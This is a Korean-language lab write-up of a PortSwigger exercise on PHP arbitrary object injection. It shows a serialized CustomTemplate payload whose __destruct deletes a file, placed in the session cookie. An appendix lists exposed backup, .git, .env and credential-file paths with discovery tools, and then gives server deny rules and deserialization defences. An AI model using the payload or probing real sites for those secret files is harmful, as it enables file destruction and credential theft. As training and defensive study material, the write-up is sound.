# Lab: Arbitrary object injection in PHP

## 개요

- **난이도**: Practitioner
- **주제**: Insecure Deserialization — 임의 객체 주입(Arbitrary Object Injection) / 매직 메서드(`__destruct`) / 소스코드 백업 파일 노출
- **링크**: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php

## 목표

직렬화 객체를 **새로 만들어 주입**해, 악성 객체가 역직렬화될 때 자동 실행되는 매직 메서드를 악용하여 `carlos` 홈 디렉터리의 `morale.txt` 파일을 삭제한다.

- 계정: `wiener:peter`
- 힌트: 파일명 뒤에 물결표(`~`)를 붙이면 에디터가 만든 백업 파일을 읽을 수 있는 경우가 있다.

## 배경 개념 — 임의 객체 주입과 매직 메서드

```
[지금까지와의 차이]
  001~002: 기존 객체의 "속성/타입" 변조
  003:     기존 객체의 속성을 앱 기능이 소비
  004:     "새로운 객체(CustomTemplate)" 자체를 주입
           → 역직렬화 시 그 클래스의 매직 메서드가 자동 호출됨

[왜 위험한가]
  PHP 는 역직렬화 과정에서 객체를 복원하고,
  스크립트 종료 시 __destruct() 를 자동 호출한다.
  공격자가 제어하는 객체의 매직 메서드가 위험한 sink(unlink 등)를 호출하면
  코드 실행 없이도 원하는 동작을 유발할 수 있다.
```

```
[CustomTemplate 클래스의 위험 메서드(개념)]
  class CustomTemplate {
      public $lock_file_path;
      public function __destruct() {
          unlink($this->lock_file_path);   // ← 소멸 시 파일 삭제
      }
  }

  → lock_file_path 를 carlos 의 morale.txt 로 설정한 객체를 주입하면
    역직렬화 직후(스크립트 종료 시) 이 파일이 삭제된다.
```

## 취약 지점

```
[근본 원인]
  1) 서버가 사용자 세션 쿠키를 신뢰해 임의 클래스로 역직렬화
     (unserialize 시 클래스 오토로딩 허용 → 공격자가 클래스 선택 가능)
  2) 해당 클래스에 위험한 매직 메서드(__destruct → unlink)가 존재
  3) 소스코드(클래스 정의)가 노출되어 있어 공격자가 "어떤 클래스를 어떤 속성으로
     주입해야 하는지" 를 알 수 있음  ← 이 랩의 실습 트릭
```

## 공격 단계

### 1단계 — 직렬화 세션 확인

로그인 후 세션 쿠키가 직렬화 PHP 객체임을 확인한다.

### 2단계 — 소스코드 참조 발견

사이트맵에서 `/libs/CustomTemplate.php` 파일이 참조되는 것을 확인하고
해당 요청을 Repeater 로 보낸다.

### 3단계 — 백업 파일로 소스코드 열람

요청 라인의 파일명 뒤에 `~` 를 붙이면 에디터 백업 파일이 반환된다.

```
GET /libs/CustomTemplate.php~ HTTP/1.1
→ CustomTemplate 클래스의 소스코드(특히 __destruct) 열람
```

```
[발견한 정보]
  __destruct() 가 $this->lock_file_path 에 대해 unlink() 호출 → 삭제 sink 확보
```

### 4단계 — 악성 직렬화 객체 생성

Decoder 로 `CustomTemplate` 객체를 직접 만든다. 타입 지정자와 길이를 정확히 맞춘다.

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

```
  O:14:"CustomTemplate"    클래스명 "CustomTemplate" (14글자)
  :1:                      속성 1개
  s:14:"lock_file_path";   속성명 "lock_file_path" (14글자)
  s:23:"/home/carlos/morale.txt";   값 (23바이트)
```

Base64 + URL 인코딩해 쿠키 값으로 준비한다.

### 5단계 — 세션 쿠키 교체 후 전송

세션 쿠키를 위에서 만든 값으로 교체해 요청을 보낸다.
스크립트 종료 시 `__destruct()` 가 자동 호출되어 `/home/carlos/morale.txt` 가 삭제된다 → 랩 해결.

## 부록 — 민감 정보 노출 / 백업 파일 조사

> 이 랩의 실습 포인트(`~` 백업 파일)를 계기로, 소스·설정·VCS 등이 웹에 노출되는
> 전형적인 패턴을 유형별로 분류해 정리한다.

### A. 소스코드 / 에디터 백업 파일

```
[편집기·백업 접미어]
  <file>~          Emacs/vim 백업 (이 랩의 트릭)
  <file>.bak       일반 백업
  <file>.orig      원본(패치/머지 전)
  <file>.save      저장본
  <file>.old       이전 버전
  <file>.copy      복사본
  <file>.tmp       임시
  <file>.rej       patch 거부 파일

[편집기 임시·스왑]
  .<file>.swp / .<file>.swo / .<file>.swm   vim swap
  <file>.un~                                vim undo
  #<file>#                                  Emacs autosave

[이중 확장자 변형 (필터 우회 목적)]
  index.php.bak   index.php~      index.php.orig
  index.php.save  index.php.txt   index.php.html
  .index.php.swp  index.php.1     index.php.2
```

```
[예 — 백업 소스 요청]
  GET /libs/CustomTemplate.php~ HTTP/1.1
  GET /index.php.bak HTTP/1.1
  GET /.index.php.swp HTTP/1.1
```

### B. 버전 관리 시스템(VCS) 노출

```
[GIT]
  /.git/                     존재 여부
  /.git/config               원격 저장소 URL, 브랜치(자격증명 노출 가능)
  /.git/HEAD                 현재 브랜치 참조
  /.git/index                추적 파일 목록
  /.git/logs/HEAD            커밋 히스토리(작성자/이메일)
  /.git/objects/...          객체(소스 복원 가능)

[기타 VCS]
  /.svn/ , /.hg/ , /.bzr/ , /CVS/
  /.gitignore, /.gitattributes

[도구]
  git-dumper, GitTools(dumper/finder), dvcs-ripper, dotgit
  → 노출된 .git 에서 전체 소스 히스토리를 복원할 수 있다.
```

### C. 압축 아카이브 / DB 덤프

```
  backup.zip  site.tar  site.tar.gz  site.tgz  www.rar  backup.7z
  dump.sql    backup.sql  database.sql  db.sql
  .sql.gz
[위험] 전체 소스/DB/자격증명이 한 번에 유출
```

### D. 설정 / 환경 파일

```
  .env, .env.bak, .env.local
  wp-config.php, config.php, config.php.bak
  settings.py, local_settings.py
  application.yml, application.properties
  web.config, .htaccess
  .aws/credentials, .npmrc, .netrc, credentials.json, service-account.json
  phpinfo.php, info.php
[위험] DB 접속정보, API 키, JWT 시크릿 등
```

### E. OS / IDE / 배포 메타데이터

```
[OS]
  .DS_Store (macOS; 디렉터리 구조·파일명 노출)
  Thumbs.db (Windows), desktop.ini
[IDE]
  .idea/ , .vscode/ , *.sln , *.csproj , *.iml
[빌드/배포/CI]
  Dockerfile, docker-compose.yml, .dockerignore
  Makefile, Procfile, Jenkinsfile
  .travis.yml, .gitlab-ci.yml, .github/workflows/
  package.json, composer.json, composer.lock, Gemfile.lock
  *.map (소스맵 → 원본 프론트엔드 소스 노출)
[로그/디버그]
  *.log, access.log, error.log, debug.log, console.log
```

### F. 발견(Discovery) 방법

```
1) 알려진 파일명 기반
   - 사이트맵에서 참조된 경로에 접미어/이중확장자 퍼징
     (예: /libs/CustomTemplate.php → .php~ , .php.bak ...)
2) 콘텐츠 디스커버리(Content Discovery)
   - Burp Content Discovery, ffuf, gobuster, feroxbuster, dirsearch
   - 워드리스트: raft-*, directory-list, SecLists, 백업/설정 전용 목록
3) 표준 노출 경로
   - /robots.txt, /sitemap.xml (숨김 경로 힌트)
   - /.git/HEAD, /.env, /.DS_Store 등 상용 목록
4) 응답 차이 분석
   - 상태코드(200/301/403), Content-Length, 렌더링 차이 비교
   - 존재하는 파일과 404 의 미묘한 차이 식별
5) 소스맵/주석
   - JS `.map`, HTML 주석, 디버그 엔드포인트에서 내부 경로 획득
```

### G. 방어

```
[배포 위생]
  1. 소스코드/백업/설정을 웹루트에 배포하지 않는다.
     - 편집기 백업 파일 생성 비활성(in-place backup off) 또는 배포 전 제거
     - .env, DB 덤프, 아카이브를 webroot 밖에 둔다.
  2. VCS 디렉터리를 webroot 밖에 두거나 노출을 차단한다.
     - 배포는 export/archive 로 .git/.svn 을 제외

[서버/프록시 차단]
  Nginx:
    location ~ /\.            { deny all; }        # dotfile 전부 차단
    location ~* \.(bak|old|orig|save|swp|swo|tmp)$ { deny all; }
    location ~* \.git          { deny all; }
  Apache:
    <FilesMatch "\.(bak|old|orig|save|swp|swo|tmp|sql)$"> Require all denied </FilesMatch>
    <DirectoryMatch "/\.git"> Require all denied </DirectoryMatch>
  WAF: 백업 접미어/`/.git/`/.env` 요청 차단 규칙

[탐지/모니터링]
  3. 주기적 콘텐츠 디스커버리 스캔을 CI/CD 에 포함, 노출 회귀 방지
  4. `/.git/`, `/.env`, `*.bak` 접근 로그 모니터링/알림

[최소 권한/시크릿]
  5. 시크릿은 환경변수/시크릿 매니저로 분리, 코드/저장소에 하드코딩 금지
  6. 소스 파일은 읽기/실행 권한을 최소화, 웹 서버가 소스를 직접 서빙하지 않도록
```

## 방어 (역직렬화)

```
[근본 원칙]
  신뢰할 수 없는 입력(세션 쿠키)을 임의 클래스로 역직렬화하지 않는다.

[구체적 방어]
  1. allowed_classes 제한
     - unserialize($data, ['allowed_classes' => false])
       또는 허용 클래스 화이트리스트만 지정 → 임의 객체 주입 차단.
  2. 안전한 포맷/무결성
     - JSON 등 데이터 전용 포맷 + 스키마 검증, 서명(HMAC)으로 변조 방지.
  3. 서버 측 세션
     - 세션 상태를 클라이언트에 직렬화해 두지 않는다.
  4. 매직 메서드 최소화
     - __destruct/__wakeup 등에서 위험한 sink(unlink, exec, 파일쓰기) 호출 금지.
  5. 소스/백업 비노출
     - 위 G 대로 백업·VCS·설정 노출을 차단해 가젯 후보 정보를 숨긴다.
  6. 최소 권한
     - 역직렬화 프로세스의 파일/네트워크 권한 최소화.
```

## 핵심 정리

- 노출된 백업 파일(`CustomTemplate.php~`)로 소스코드를 읽어 `__destruct()` → `unlink($lock_file_path)` sink 를 발견했다.
- `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}` 를 Base64/URL 인코딩해 세션 쿠키에 주입, 역직렬화 시 매직 메서드가 자동 호출되어 carlos 파일을 삭제했다.
- 001~003 과 달리 "기존 객체 변조" 가 아니라 **임의 객체를 새로 주입**하는 유형이며, 매직 메서드가 자동 실행 트리거가 됐다.
- 부가적으로 소스·백업·VCS·설정 노출(`~`, `.bak`, `.git` 등)의 유형·탐색·방어를 분류해 정리했다.

## 배운 점

- 역직렬화는 "데이터 복원" 이지만, 복원된 클래스의 매직 메서드가 자동 호출되므로 공격 표면이 코드 실행 영역까지 넓어진다.
- 임의 객체 주입을 막으려면 `allowed_classes` 화이트리스트가 핵심이며, 애초에 신뢰 불가 입력을 역직렬화하지 않는 것이 최선이다.
- 소스코드/백업 파일 노출(`~`, `.bak`, `.git`, `.env`)은 그 자체로도 정보 노출이지만, 이 랩처럼 **공격에 필요한 정보(가젯 후보)** 를 제공해 익스플로잇 난이도를 크게 낮춘다.
- 배포 시 백업/설정/VCS 를 웹루트에서 제거하고, 서버 레벨에서 dotfile·백업 접미어·`/.git` 접근을 차단해야 한다.
